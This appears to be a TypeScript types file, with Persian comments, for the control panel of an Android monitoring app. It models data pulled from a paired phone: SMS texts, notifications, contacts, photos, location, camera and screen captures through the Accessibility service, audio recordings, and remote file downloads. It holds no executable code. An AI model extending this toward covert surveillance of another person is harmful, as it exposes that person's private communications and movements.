/** نوع‌های مشترک داده‌های پنل */

export interface DeviceSummary {
  id: string;
  name: string;
  model: string | null;
  androidVersion: string | null;
  appVersion: string | null;
  battery: number | null;
  lastSeenAt: string | null;
  lastSyncAt: string | null;
  createdAt: string;
  appCount: number;
  controlledCount: number;
  todayMinutes: number;
  weekMinutes: number;
}

export interface DeviceAppEntry {
  id: string;
  packageName: string;
  label: string;
  controlled: boolean;
}

export interface UsagePoint {
  day: string;
  packageName: string;
  minutes: number;
}

export interface EventItem {
  id: string;
  type: string;
  message: string;
  createdAt: string;
}

export interface SmsItem {
  id: string;
  smsId: number;
  address: string;
  body: string;
  /** 1=دریافتی، 2=ارسالی، ... */
  type: number;
  at: string;
}

export interface NotifItem {
  id: string;
  packageName: string;
  title: string;
  text: string;
  at: string;
}

export interface ContactItem {
  id: string;
  name: string;
  /** شماره‌ها با «، » از هم جدا شده‌اند */
  phones: string;
}

export interface PhotoItem {
  id: string;
  mediaId: number;
  takenAt: string | null;
  size: number | null;
  bucket: string | null;
  hasThumb: boolean;
}

export interface LocationInfo {
  lat: number;
  lng: number;
  accuracy: number | null;
  provider: string | null;
  at: string;
}

export interface LocationPingItem {
  id: string;
  lat: number;
  lng: number;
  accuracy: number | null;
  provider: string | null;
  at: string;
}

export interface CaptureItem {
  id: string;
  takenAt: string;
}

export interface ScreenCaptureItem {
  id: string;
  takenAt: string;
}

export interface ScreenMonitorState {
  enabled: boolean;
  startedAt: string | null;
  interval: number;
  // آیا سرویس Accessibility روی گوشی فعال است؟ (پایش صفحه فقط با Accessibility کار می‌کند)
  accessibilityEnabled?: boolean;
}

export interface AudioClipItem {
  id: string;
  recordedAt: string;
  durationSec: number;
  mimeType: string;
}

export interface AudioMonitorState {
  enabled: boolean;
  startedAt: string | null;
  interval: number;
}

export interface FileRequestItem {
  id: string;
  type: "list" | "download";
  path: string;
  status: "PENDING" | "DONE" | "ERROR";
  error: string | null;
  createdAt: string;
  doneAt: string | null;
  chunksTotal: number;
  chunksReceived: number;
  fileSize: number | null;
  fileName: string | null;
  mimeType: string | null;
}

export interface FileEntry {
  name: string;
  path: string;
  isDir: boolean;
  size: number | null;
  modifiedAt: string | null;
  mimeType: string | null;
}

export interface DeviceDetailData {
  device: Omit<
    DeviceSummary,
    "appCount" | "controlledCount" | "todayMinutes" | "weekMinutes"
  >;
  apps: DeviceAppEntry[];
  usage: UsagePoint[];
  events: EventItem[];
  sms: SmsItem[];
  notifications: NotifItem[];
  photos: PhotoItem[];
  contacts: ContactItem[];
  location: LocationInfo | null;
  pings: LocationPingItem[];
  captures: CaptureItem[];
  screens: ScreenCaptureItem[];
  screenMonitor: ScreenMonitorState;
  audioClips: AudioClipItem[];
  audioMonitor: AudioMonitorState;
  counts: {
    sms: number;
    notifs: number;
    photos: number;
    contacts: number;
    captures: number;
    pendingCommands: number;
    screens: number;
    audioClips: number;
  };
}

export interface PairingItem {
  id: string;
  code: string;
  note: string | null;
  used: boolean;
  expiresAt: string;
  createdAt: string;
  usedAt: string | null;
  deviceName: string | null;
}
